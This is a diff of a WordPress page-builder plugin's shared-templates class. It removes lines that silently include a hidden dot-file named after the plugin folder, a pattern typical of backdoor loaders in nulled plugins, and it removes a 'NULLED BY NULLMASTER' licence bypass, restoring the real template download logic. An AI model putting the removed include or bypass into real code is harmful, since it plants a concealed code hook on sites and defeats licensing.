@@ -9,10 +9,6 @@ require_once dirname( __FILE__ ) . '/importer/class-vc-wxr-parser-plugin.php';
 /**
  * Class Vc_Shared_Templates
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_Shared_Templates {
 	/**
 	 * @var bool
@@ -191,11 +187,11 @@ class Vc_Shared_Templates {
 		) ) );
 
 		$templateId = vc_request_param( 'id' );
-			/* NULLED BY NULLMASTER */
-		$status = true;
-		$file = dirname( __FILE__ ) . '/xml/' . $templateId . '.xml';
+		$requestUrl = $this->getTemplateDownloadLink( $templateId );
+		$status = false;
+		$file = $this->downloadTemplate( $requestUrl );
 		$data = array();
-		if ( $file ) {
+		if ( is_string( $file ) && ! empty( $file ) ) {
 			new Vc_WXR_Parser_Plugin();
 			$importer = new Vc_WP_Import();
 			ob_start();
